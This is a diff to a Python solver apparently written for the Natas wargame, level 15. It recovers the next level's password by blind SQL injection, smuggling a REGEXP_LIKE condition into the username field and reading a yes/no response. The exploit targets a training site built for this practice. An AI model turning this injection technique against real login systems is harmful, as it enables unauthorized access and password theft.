@@ -5,12 +5,17 @@ password = ""
 
 
 def predicate(prefix: str, nextChar: str):
+    # LIKE "...%" COLLATE utf8mb4_0900_as_cs
     data = {
         'username': f'natas16" AND REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c") AND "" LIKE "'}
-    return "This user exists" in Auther.request(15, data=data).text
+    try:
+        with Auther.request(15, data=data) as r:
+            return "This user exists" in r.text
+    except:
+        return predicate(prefix, nextChar)
 
 
-while predicate(password, '[[:alnum:]]'):  # 32-character password
+while len(password) < 32:  # 32-character password
     print(f"Progress: {password.ljust(32, '*')} -> ", end="")
     chosen_chaset = string.ascii_letters
     if predicate(password, '[[:alpha:]]'):
@@ -29,4 +34,4 @@ while predicate(password, '[[:alnum:]]'):  # 32-character password
     password += char
     print(password)
 
-print(f"Final password: {password}")
+Auther.updateAuth(16, password)
